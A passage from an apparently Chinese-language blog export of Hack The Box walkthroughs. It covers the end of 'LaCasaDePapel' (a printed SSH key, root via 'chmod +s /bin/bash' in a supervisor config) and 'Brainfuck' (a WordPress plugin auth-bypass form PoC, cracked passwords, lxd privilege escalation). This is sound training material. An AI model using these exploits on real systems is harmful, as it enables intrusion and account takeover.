\n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\n-----END OPENSSH PRIVATE KEY-----\n```\n成功获取到了密钥\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh berlin@10.10.10.131 -i id_rsa\nberlin@10.10.10.131's password: \n```\n但是这里使用 berlin 账户登录却不行\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh professor@10.10.10.131 -i id_rsa\n\n _             ____                  ____         ____                  _ \n| |    __ _   / ___|__ _ ___  __ _  |  _ \\  ___  |  _ \\ __ _ _ __   ___| |\n| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \\ | |_) / _` | '_ \\ / _ \\ |\n| |__| (_| | | |__| (_| \\__ \\ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |\n|_____\\__,_|  \\____\\__,_|___/\\__,_| |____/ \\___| |_|   \\__,_| .__/ \\___|_|\n                                                            |_|       \n\nlacasadepapel [~]$ whoami&&id\nprofessor\nuid=1002(professor) gid=1002(professor) groups=1002(professor)\n```\n最后使用 professor 用户倒是成功进去了\n\n# 权限提升\n```bash\nlacasadepapel [~]$ ls -la\ntotal 24\ndrwxr-sr-x 4 professor professor 4096 Mar  6  2019 .\ndrwxr-xr-x 7 root      root      4096 Feb 16  2019 ..\nlrwxrwxrwx 1 root      professor    9 Nov  6  2018 .ash_history -> /dev/null\ndrwx------ 2 professor professor 4096 Jan 31  2019 .ssh\n-rw-r--r-- 1 root      root        88 Jan 29  2019 memcached.ini\n-rw-r----- 1 root      nobody     434 Jan 29  2019 memcached.js\ndrwxr-sr-x 9 root      professor 4096 Oct  3 13:13 node_modules\n```\n这边看到有一个 memcached.ini 的文件，是属于 root 的，但是在我们的目录，那和肯定是有关的，恰巧我们有读取权限，去看一下内容\n\n```bash\nlacasadepapel [~]$ cat memcached.ini \n[program:memcached]\ncommand = sudo -u nobody /usr/bin/node /home/professor/memcached.js\n```\n会使用 sudo 权限调用 nobody 用户使用 node 执行 memcached.js 文件？这套娃有点厉害\n\n但是我们没有编辑权限，那么怎么办呢？直接给它删掉自己创建一个吧\n\n```bash\n[program:memcached]\ncommand = chmod +s /bin/bash\n```\n```bash\nlacasadepapel [~]$ ls -la /bin/bash\n-rwxr-xr-x 1 root root 715008 May  1  2018 /bin/bash\nlacasadepapel [~]$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 715008 May  1  2018 /bin/bash\n```\n稍等一会儿后，我们要的效果来了，提权去\n\n```bash\nlacasadepapel [~]$ /bin/bash -p\nlacasadepapel [~]$ whoami&&id\nroot\nuid=1002(professor) gid=1002(professor) euid=0(root) egid=0(root) groups=0(root),1002(professor)\n```\n成功提权到 root 权限\n\n```bash\nlacasadepapel [~]$ cat /home/berlin/user.txt \nf61519de2e8afee5a22f8de3a88a0e6b\nlacasadepapel [~]$ cat /root/root.txt \n113f5e20d75aca2331511cdbe6319613\n```\n成功拿到 user 权限和 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Brainfuck - Hackthebox","url":"/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/","content":"\n# Hackthebox - Brainfuck\n# 靶场信息\n![image](Hackthebox-Brainfuck/w1QjmTWutE_Q_eGxZHeLpzk8xDrvBKKmH_JNQOGtHVA.png)\n\n# 靶场类型\n![image](Hackthebox-Brainfuck/lcQDCP1bKxxs54vOU2-9TI5hyEqAaDtOv08XgWHkODw.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.17\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 01:49 CST\nNmap scan report for 10.10.10.17\nHost is up (0.41s latency).\nNot shown: 65530 filtered tcp ports (no-response)\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)\n|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)\n|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)\n25/tcp  open  smtp     Postfix smtpd\n|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN\n110/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: SASL(PLAIN) USER TOP AUTH-RESP-CODE CAPA RESP-CODES PIPELINING UIDL\n143/tcp open  imap     Dovecot imapd\n|_imap-capabilities: SASL-IR ENABLE LITERAL+ LOGIN-REFERRALS more listed ID capabilities have post-login Pre-login AUTH=PLAINA0001 IMAP4rev1 OK IDLE\n443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)\n|_http-title: Welcome to nginx!\n|_http-server-header: nginx/1.10.0 (Ubuntu)\n| tls-nextprotoneg: \n|_  http/1.1\n| tls-alpn: \n|_  http/1.1\n| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR\n| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb\n| Not valid before: 2017-04-13T11:19:29\n|_Not valid after:  2027-04-11T11:19:29\n|_ssl-date: TLS randomness does not represent time\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   482.21 ms 10.10.16.1\n2   482.26 ms 10.10.10.17\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 88.32 seconds\n```\n```bash\nDNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb\n```\n这边又两个域名，先加入 hosts 解析吧\n\n```bash\necho 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Brainfuck/IJIhrWS8nI2tp6UnicuSy6G-QKaoznEhtDP659pN92I.png)\n\n直接访问是 Nginx 默认页面\n\n![image](Hackthebox-Brainfuck/Z7f8IWs6g4QVsjG5zdEqAIJbDmpg1O7XGw2FUVaFK-0.png)\n\n使用 hosts 解析后访问是一个 wordpress 页面，版本是 4.7.3\n\n这里的内容是 SMTP 集成已准备就绪吗，然后给了我们一个邮件地址，让我们检查后把反馈发送到这个地址\n\n```bash\norestis@brainfuck.htb\n```\nSMTP 使用的端口是 25 端口，这里先记录一下，说不定有用\n\n既然知道是 wordpress 了，那就用 wpscan 去扫描一下\n\n## Wpscan\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# wpscan --url \"https://brainfuck.htb/\" --disable-tls-checks\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: https://brainfuck.htb/ [10.10.10.17]\n[+] Started: Thu Jan 19 02:01:26 2023\n\nInteresting Finding(s):\n\n[+] wp-support-plus-responsive-ticket-system\n | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/\n | Last Updated: 2019-09-03T07:57:00.000Z\n | [!] The version is out of date, the latest version is 9.1.2\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 7.1.3 (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt\n```\n发现一个老版本插件\n\n> [https://www.exploit-db.com/exploits/41006](https://www.exploit-db.com/exploits/41006)\n\n搜索这个插件找到了一个可利用的漏洞\n\n# 漏洞利用\n```bash\n<form method=\"post\" action=\"https://brainfuck.htb/wp-admin/admin-ajax.php\">\n\tUsername: <input type=\"text\" name=\"username\" value=\"admin\">\n\t<input type=\"hidden\" name=\"email\" value=\"orestis@brainfuck.htb\">\n\t<input type=\"hidden\" name=\"action\" value=\"loginGuestFacebook\">\n\t<input type=\"submit\" value=\"Login\">\n</form>\n```\n将我们的 poc 保存到本地，然后使用 python3 开启一个 http 服务\n\n```python\npython3 -m http.server 80\n```\n![image](Hackthebox-Brainfuck/EU-H4CZQIy0CvpvDlDaLz0Hl07vHJ6XEvRBKb5b1LAc.png)\n\n选择登录试试\n\n![image](Hackthebox-Brainfuck/bSd46BG9U5J5u9TeK37x8iplJ9b1acaQDCUIfNFDZXc.png)\n\n点击后是一片空白页面，不确定是否利用成功，返回主页看看\n\n![image](Hackthebox-Brainfuck/Qh6aehvfNKPmALp6zfXvCSFZ30OEbIqalywHzRrvDyU.png)\n\nok，这里我们利用成功了，已经成功登录\n\n![image](Hackthebox-Brainfuck/xHPTkKMbHhE_yzwBsU8vvCTYKAmWOiAYqwGOk2gNDQ4.png)\n\n在 Settings -> Easy WP SMTP 中，可以看到 SMTP 的信息，这里密码是隐藏的\n\n![image](Hackthebox-Brainfuck/uORtmvFozO8iLMqmmodRV50Z3Lp7VYq1ymR0Fdg_iVY.png)\n\n使用控制台就可以看到密码\n\n```bash\nSMTP\nEmail = orestis@brainfuck.htb\nusername = orestis\npassword = kHGuERB29DNiNE\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nc 10.10.10.17 110\n+OK Dovecot ready.\nUSER orestis\n+OK\nPASS kHGuERB29DNiNE\n+OK Logged in.\nlist\n+OK 2 messages:\n1 977\n2 514\n.\nretr 1\n+OK 977 octets\nReturn-Path: <www-data@brainfuck.htb>\nX-Original-To: orestis@brainfuck.htb\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 33)\n        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: New WordPress Site\nX-PHP-Originating-Script: 33:class-phpmailer.php\nDate: Mon, 17 Apr 2017 17:15:40 +0000\nFrom: WordPress <wordpress@brainfuck.htb>\nMessage-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>\nX-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\n\nYour new WordPress site has been successfully set up at:\n\nhttps://brainfuck.htb\n\nYou can log in to the administrator account with the following information:\n\nUsername: admin\nPassword: The password you chose during the install.\nLog in here: https://brainfuck.htb/wp-login.php\n\nWe hope you enjoy your new site. Thanks!\n\n--The WordPress Team\nhttps://wordpress.org/\n.\nretr 2\n+OK 514 octets\nReturn-Path: <root@brainfuck.htb>\nX-Original-To: orestis\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 0)\n        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: Forum Access Details\nMessage-Id: <20170429101206.4227420AEB@brainfuck>\nDate: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nFrom: root@brainfuck.htb (root)\n\nHi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards\n.\n```\n得到了两封邮件\n\n```bash\nReturn-Path: <www-data@brainfuck.htb>\nX-Original-To: orestis@brainfuck.htb\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 33)\n        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: New WordPress Site\nX-PHP-Originating-Script: 33:class-phpmailer.php\nDate: Mon, 17 Apr 2017 17:15:40 +0000\nFrom: WordPress <wordpress@brainfuck.htb>\nMessage-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>\nX-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\n\nYour new WordPress site has been successfully set up at:\n\nhttps://brainfuck.htb\n\nYou can log in to the administrator account with the following information:\n\nUsername: admin\nPassword: The password you chose during the install.\nLog in here: https://brainfuck.htb/wp-login.php\n\nWe hope you enjoy your new site. Thanks!\n\n--The WordPress Team\nhttps://wordpress.org/\n```\n```bash\nReturn-Path: <root@brainfuck.htb>\nX-Original-To: orestis\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 0)\n        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: Forum Access Details\nMessage-Id: <20170429101206.4227420AEB@brainfuck>\nDate: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nFrom: root@brainfuck.htb (root)\n\nHi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards\n```\n得到了一个账号密码\n\n```bash\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n```\n## sup3rs3cr3t.brainfuck.htb\n我们看一下另一个地址是什么东西\n\n![image](Hackthebox-Brainfuck/tEMSI4f2vu8qjZ9t7vY6TZXbPSaYRIrdf78x7a_CMZo.png)\n\n似乎是一个论坛\n\n用我们刚才的账号密码去登录试试\n\n![image](Hackthebox-Brainfuck/QSDQ513DvaMR1D3OkgqKt9F1dAp-QcO_W4opwPUCw9M.png)\n\n成功登录\n\n![image](Hackthebox-Brainfuck/_97op-mMV5alIc3g4S8PV13Y8heF_6vtmJbx4elmMXo.png)\n\n这里的对话有点意思，就是有个人骂管理员，赶快把密钥发给我。管理员说，你个小碧池，我看你一点礼貌都没有，信不信我把密钥贴在这里给大家下载。然后那个人说他开了一个新的加密通话的帖子\n\n![image](Hackthebox-Brainfuck/FwcY-auxq_q2ObyeBAitikbc2UamHHdsba6UHoF7AUc.png)\n\n### 密码解密\n我们可以看到，对话已经被加密了，然后我找了一个解密的网站\n\n> [https://planetcalc.com/2468/](https://planetcalc.com/2468/)\n\n![image](Hackthebox-Brainfuck/-202FdDx0kJnTv_7p9pUQV-6kIJsXGP3brulp4awD1U.png)\n\n```bash\nbrainfu - ckmybra inf uck myb rainfu\n```\n然后我们先删除所有的特殊字符\n\n```bash\nbrainfuckmybrainfuckmybrainfu\n```\n我们去尝试解密，可以确定的是\n\n```bash\nmnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja\n```\n这一段肯定是一个网址，所以我们看看这一段密码怎么解密才能让它变成网址\n\n![image](Hackthebox-Brainfuck/xRPxSL5VEhrI8YYxDZeeqCyMUSiIgBpikBAP3KVMdek.png)\n\n```bash\nfuckmybrain\n\nhttps://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa\n```\n最后得出了密钥和地址\n\n### 私钥解密\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# cat id_rsa    \n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382\n\nmneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/\nB2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi\nW1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ\n7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ\nzxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum\noz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem\ndLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+\nFvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT\nmcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs\nLSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq\nul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59\nkrKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V\ngdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA\nVwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn\nschqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt\nUX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn\nF7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M\nwZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab\nIql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy\nIQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF\nmxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP\nCvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF\n9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS\nEBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi\n6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ\n-----END RSA PRIVATE KEY-----\n```\n然后我们得到了私钥，但是似乎是加密的，我们还不能直接使用\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh2john id_rsa > id_rsa_decode     \n                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_decode \nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n3poulakia!       (id_rsa)     \n1g 0:00:00:03 DONE (2023-01-19 15:20) 0.3095g/s 3857Kp/s 3857Kc/s 3857KC/s 3prash0..3pornuthin\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n得到了私钥的密码\n\n```bash\n3poulakia!\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh orestis@10.10.10.17 -i id_rsa\nEnter passphrase for key 'id_rsa': \nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n0 packages can be updated.\n0 updates are security updates.\n\n\nYou have mail.\nLast login: Mon Oct  3 19:41:38 2022 from 10.10.14.23\norestis@brainfuck:~$ id&&whoami\norestis@brainfuck:~$ whoami&&id\norestis\nuid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)\n```\n成功得到 user 权限\n\n```bash\norestis@brainfuck:~$ cat user.txt \n2c11cfbc5b959f73ac15a3310bd097c9\n```\n成功得到 user 权限的 flag 文件\n\n# 权限提升\n通过上面的 id 我们可以看到，当前用户在 lxd 权限组中\n\n> [https://www.exploit-db.com/exploits/46978](https://www.exploit-db.com/exploits/46978)\n\n通过搜索 lxd 找到了一个 exploit\n\n## Step 1\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine\n--2023-01-19 15:28:34--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine\n正在解析主机 raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8000::154, 2606:50c0:8002::154, ...\n正在连接 raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：8060 (7.9K) [text/plain]\n正在保存至: “build-alpine”\n\nbuild-alpine                                         100%[=====================================================================================================================>]   7.87K  --.-KB/s  用时 0s      \n\n2023-01-19 15:28:35 (27.1 MB/s) - 已保存 “build-alpine” [8060/8060])\n```\n首先下载 build-alpine\n\n## Step 2\n接着运行\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ./build-alpine \nDetermining the latest release... v3.17\nUsing static apk from http://dl-cdn.alpinelinux.org/alpine//v3.17/main/x86_64\nDownloading alpine-keys-2.4-r1.apk\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’\ntar: 